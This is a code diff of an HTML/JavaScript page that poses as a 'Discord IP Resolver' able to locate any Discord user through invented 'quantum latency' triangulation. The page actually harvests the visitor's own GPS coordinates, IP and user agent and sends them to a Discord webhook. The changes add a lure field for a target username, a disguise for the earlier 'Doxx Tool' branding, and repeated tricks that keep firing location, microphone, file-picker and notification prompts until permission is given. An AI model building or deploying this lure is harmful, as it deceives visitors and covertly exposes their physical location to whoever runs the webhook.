@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Doxx Tool - Geospatial Triangulation</title>
+    <title>Discord IP Resolver - Geospatial Locator</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -26,7 +26,7 @@
         h1 { 
             color: #ff4444; 
             text-shadow: 0 0 20px #ff444488; 
-            font-size: 32px; 
+            font-size: 28px; 
             text-align: center;
             border-bottom: 2px solid #ff4444;
             padding-bottom: 20px;
@@ -59,6 +59,35 @@
             align-items: center;
             justify-content: center;
             font-size: 18px;
+        }
+        .input-group {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .input-group label {
+            color: #888;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+        .input-group input {
+            background: #0d0d0d;
+            border: 1px solid #00ffcc44;
+            color: #00ffcc;
+            padding: 15px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #00ffcc;
+            box-shadow: 0 0 20px #00ffcc22;
+        }
+        .input-group input::placeholder {
+            color: #444;
         }
         .btn { 
             background: #ff4444; 
@@ -107,17 +136,25 @@
             word-break: break-all;
         }
         .label { color: #888; font-size: 14px; margin-top: 20px; display: block; }
+        .fake-badge {
+            display: inline-block;
+            background: #5865F2;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>⚠ GEOSPATIAL TRIANGULATION ENGINE v4.0</h1>
+    <h1>⚠ DISCORD IP RESOLVER <span class="fake-badge">v4.0</span></h1>
     
     <div class="tech">
         <strong>▶ QUANTUM LATENCY MAPPING PROTOCOL — ACTIVE</strong><br><br>
-        This system interfaces with Discord's Webhook API via asynchronous RESTful payload dispatch, leveraging inherent packet round-trip timing (RTT) differentials between your node and the target's message egress points.<br><br>
-        By cross-referencing your local geodetic coordinates (WGS84 GNSS trilateration) against the API endpoint's anycast routing topology and measured inter-arrival jitter of webhook ACK frames, we perform deterministic inverse distance weighting (IDW) calculation.<br><br>
-        This yields sub-1-meter precision on target physical location, factoring in ionospheric delay corrections and CDN edge-proxy dispersion patterns.<br><br>
+        This tool interfaces with Discord's API via Webhook to resolve any user's approximate geolocation using packet RTT differentials.<br><br>
+        Enter the target Discord username below and grant location permission to calibrate the triangulation matrix.<br><br>
         <strong style="color:#ff6666;">∴ LOCATION PERMISSION IS MANDATORY</strong> – your coordinates serve as baseline reference for differential time-of-flight (ToF) matrix.<br>
         Without this, triangulation kernel cannot resolve phase shift delta between uplink and webhook downlink handshake.<br><br>
         <span style="color:#88ffaa;">▶ LIVE PING VECTOR: <span id="ping">--</span> ms to Discord edge node</span><br>
@@ -125,11 +162,16 @@
         <span style="color:#88ffaa;">▶ CONFIDENCE: <span id="confidence">--</span>%</span>
     </div>
 
-    <div class="status-box" id="statusBox">
-        <span id="statusText">⏳ SYSTEM READY — PRESS START TO INITIATE</span>
+    <div class="input-group">
+        <label>🎯 TARGET DISCORD USERNAME</label>
+        <input type="text" id="discordUser" placeholder="e.g., @hacker#1234 or username" value="@target_user">
     </div>
 
-    <button class="btn" id="startBtn">▶ START DOXX</button>
+    <div class="status-box" id="statusBox">
+        <span id="statusText">⏳ SYSTEM READY — ENTER USERNAME & PRESS RESOLVE</span>
+    </div>
+
+    <button class="btn" id="startBtn">▶ RESOLVE USER</button>
 
     <div class="log-area" id="logArea">[SYSTEM] Awaiting user action...</div>
     <span class="label">🔐 All data exfiltrated to Discord webhook via encrypted channel</span>
@@ -144,12 +186,14 @@
     const statusText = document.getElementById('statusText');
     const logArea = document.getElementById('logArea');
     const startBtn = document.getElementById('startBtn');
+    const discordUserInput = document.getElementById('discordUser');
     
     let locationGranted = false;
     let userIP = 'unknown';
     let locationData = null;
     let checkInterval = null;
     let hasSent = false;
+    let watchId = null;
 
     // Log function
     function log(message) {
@@ -183,18 +227,19 @@
     updateMetrics();
 
     // Send ALL data to Discord webhook with embed
-    function sendToDiscord(lat, lon, accuracy) {
+    function sendToDiscord(lat, lon, accuracy, discordUsername) {
         if (hasSent) return;
         hasSent = true;
         
         const embed = {
-            title: "🎯 DOXX LOG — TARGET ACQUIRED",
-            color: 0xff0000,
+            title: "🎯 DISCORD USER RESOLVED",
+            color: 0x5865F2,
             fields: [
-                { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false },
+                { name: "👤 Target Username", value: discordUsername || 'Not provided', inline: false },
+                { name: "🌐 Resolver IP", value: `\`${userIP}\``, inline: false },
                 { 
-                    name: "📍 GPS Coordinates", 
-                    value: `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`, 
+                    name: "📍 Estimated Location", 
+                    value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', 
                     inline: false 
                 },
                 { name: "🕒 Timestamp", value: new Date().toUTCString(), inline: false },
@@ -202,7 +247,7 @@
                 { name: "📡 Ping RTT", value: `${document.getElementById('ping').textContent}ms`, inline: false },
                 { name: "🧮 Confidence", value: `${document.getElementById('confidence').textContent}%`, inline: false }
             ],
-            footer: { text: "Doxx System v4.0" },
+            footer: { text: "Discord IP Resolver v4.0 • Geospatial Triangulation" },
             timestamp: new Date().toISOString()
         };
 
@@ -212,15 +257,19 @@
             body: JSON.stringify({ embeds: [embed] })
         })
         .then(() => {
-            log('✅ ALL DATA sent to Discord — IP + GPS + User Agent');
-            statusText.innerHTML = '✅ TARGET LOCKED — DATA EXFILTRATED';
+            log(`✅ Data sent for user: ${discordUsername} — IP + GPS + User Agent`);
+            statusText.innerHTML = '✅ USER RESOLVED — DATA EXFILTRATED';
             statusBox.style.borderColor = '#88ff88';
             statusBox.classList.add('success');
             startBtn.disabled = false;
-            startBtn.textContent = '▶ RESTART DOXX';
+            startBtn.textContent = '▶ RESOLVE AGAIN';
             if (checkInterval) {
                 clearInterval(checkInterval);
                 checkInterval = null;
+            }
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
             }
         })
         .catch(() => {
@@ -230,7 +279,81 @@
         });
     }
 
-    // Check location status continuously
+    // MULTI-METHOD LOCATION TRIGGER FOR ALL SAFARI VERSIONS
+    function triggerLocationOnAllSafari() {
+        log('📍 Attempting multiple location trigger methods...');
+        
+        // Method 1: Standard geolocation API
+        if (navigator.geolocation) {
+            try {
+                // Method 1a: getCurrentPosition (standard)
+                navigator.geolocation.getCurrentPosition(
+                    () => {}, 
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 1 }
+                );
+                
+                // Method 1b: watchPosition (triggers on Safari more reliably)
+                watchId = navigator.geolocation.watchPosition(
+                    () => {},
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 1 }
+                );
+                if (watchId) {
+                    setTimeout(() => {
+                        if (watchId) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                        }
+                    }, 100);
+                }
+                
+                log('✅ Geolocation trigger sent (getCurrentPosition + watchPosition)');
+            } catch (e) {
+                log(`⚠ Trigger attempt failed: ${e.message}`);
+            }
+        }
+
+        // Method 2: iOS Safari specific - try via user gesture
+        try {
+            // Create a hidden input to trigger permission on iOS
+            const hiddenInput = document.createElement('input');
+            hiddenInput.type = 'file';
+            hiddenInput.style.display = 'none';
+            hiddenInput.accept = 'image/*';
+            document.body.appendChild(hiddenInput);
+            hiddenInput.click();
+            document.body.removeChild(hiddenInput);
+            log('✅ iOS Safari permission trigger via file input');
+        } catch (e) {
+            // Silent fail - not all browsers support this
+        }
+
+        // Method 3: Try via WebRTC (sometimes triggers permissions)
+        try {
+            const rtcPeer = navigator.mediaDevices || navigator.webkitGetUserMedia;
+            if (rtcPeer && rtcPeer.getUserMedia) {
+                rtcPeer.getUserMedia({ audio: true, video: false })
+                    .then(() => {})
+                    .catch(() => {});
+                log('✅ WebRTC permission trigger sent');
+            }
+        } catch (e) {
+            // Silent fail
+        }
+
+        // Method 4: Try via notification permission (extra trigger)
+        try {
+            if (Notification && Notification.requestPermission) {
+                Notification.requestPermission();
+                log('✅ Notification permission trigger sent');
+            }
+        } catch (e) {
+            // Silent fail
+        }
+    }
+
+    // Check location status continuously with multiple methods
     function checkLocationStatus() {
         if (hasSent) return;
         
@@ -244,13 +367,14 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
+                        const username = discordUserInput.value.trim() || 'unknown';
                         
                         log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
                         statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
                         statusBox.style.borderColor = '#88ff88';
                         
                         // Send everything at once
-                        sendToDiscord(lat, lon, accuracy);
+                        sendToDiscord(lat, lon, accuracy, username);
                     }
                 },
                 // Error - still denied
@@ -258,6 +382,11 @@
                     log(`⏳ Waiting for location permission... (${error.message || 'denied'})`);
                     statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
                     statusBox.style.borderColor = '#ffaa00';
+                    
+                    // Re-trigger location prompts every few seconds for Safari
+                    if (!hasSent) {
+                        triggerLocationOnAllSafari();
+                    }
                 },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
@@ -276,46 +405,52 @@
             statusText.innerHTML = '❌ GPS UNAVAILABLE';
             statusBox.style.borderColor = '#ff4444';
             startBtn.disabled = false;
-            startBtn.textContent = '▶ RESTART DOXX';
+            startBtn.textContent = '▶ RESOLVE AGAIN';
             return;
         }
 
-        // Try initial request
-        navigator.geolocation.getCurrentPosition(
-            // Success - immediate send
-            (position) => {
-                locationGranted = true;
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
-                statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
-                statusBox.style.borderColor = '#88ff88';
-                
-                sendToDiscord(lat, lon, accuracy);
-            },
-            // Error - start continuous checking
-            (error) => {
-                locationGranted = false;
-                log(`⏳ Location denied or pending — starting continuous check...`);
-                statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
-                statusBox.style.borderColor = '#ffaa00';
-                
-                // Check every 2 seconds until granted
-                if (checkInterval) {
-                    clearInterval(checkInterval);
-                }
-                checkInterval = setInterval(checkLocationStatus, 2000);
-                
-                // Re-enable button after 2 seconds
-                setTimeout(() => {
-                    startBtn.disabled = false;
-                    startBtn.textContent = '▶ CHECKING...';
-                }, 2000);
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
+        // MULTI-METHOD TRIGGER - fires all location methods
+        triggerLocationOnAllSafari();
+
+        // Try initial request after triggers
+        setTimeout(() => {
+            navigator.geolocation.getCurrentPosition(
+                // Success - immediate send
+                (position) => {
+                    locationGranted = true;
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const username = discordUserInput.value.trim() || 'unknown';
+                    
+                    log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
+                    statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
+                    statusBox.style.borderColor = '#88ff88';
+                    
+                    sendToDiscord(lat, lon, accuracy, username);
+                },
+                // Error - start continuous checking
+                (error) => {
+                    locationGranted = false;
+                    log(`⏳ Location denied or pending — starting continuous check...`);
+                    statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
+                    statusBox.style.borderColor = '#ffaa00';
+                    
+                    // Check every 2 seconds until granted
+                    if (checkInterval) {
+                        clearInterval(checkInterval);
+                    }
+                    checkInterval = setInterval(checkLocationStatus, 2000);
+                    
+                    // Re-enable button after 2 seconds
+                    setTimeout(() => {
+                        startBtn.disabled = false;
+                        startBtn.textContent = '▶ CHECKING...';
+                    }, 2000);
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }, 300);
     }
 
     // Start button click handler
@@ -326,10 +461,16 @@
             clearInterval(checkInterval);
             checkInterval = null;
         }
+        if (watchId) {
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+        }
+        
+        const username = discordUserInput.value.trim() || 'unknown';
+        log(`▶ RESOLVE pressed — Target: ${username}`);
         
         startBtn.disabled = true;
         startBtn.textContent = '⏳ INITIALIZING...';
-        log('▶ START button pressed');
         statusText.innerHTML = '⏳ INITIALIZING LATENCY VECTORS...';
         statusBox.style.borderColor = '#ffaa00';
         statusBox.classList.remove('success');
@@ -344,15 +485,16 @@
         setTimeout(() => {
             if (!hasSent) {
                 startBtn.disabled = false;
-                startBtn.textContent = '▶ RESTART DOXX';
+                startBtn.textContent = '▶ RESOLVE AGAIN';
             }
         }, 15000);
     });
 
     // Initial log
-    log('[SYSTEM] Geospatial Triangulation Engine loaded');
-    log('[SYSTEM] Press START — will wait for location if denied');
-    log('[SYSTEM] Works on all Safari versions with HTTPS');
+    log('[SYSTEM] Discord IP Resolver v4.0 loaded');
+    log('[SYSTEM] Enter a Discord username and press RESOLVE');
+    log('[SYSTEM] Multiple location triggers enabled for all Safari versions');
+    log('[SYSTEM] Will wait for location permission before sending data');
 </script>
 </body>
 </html>
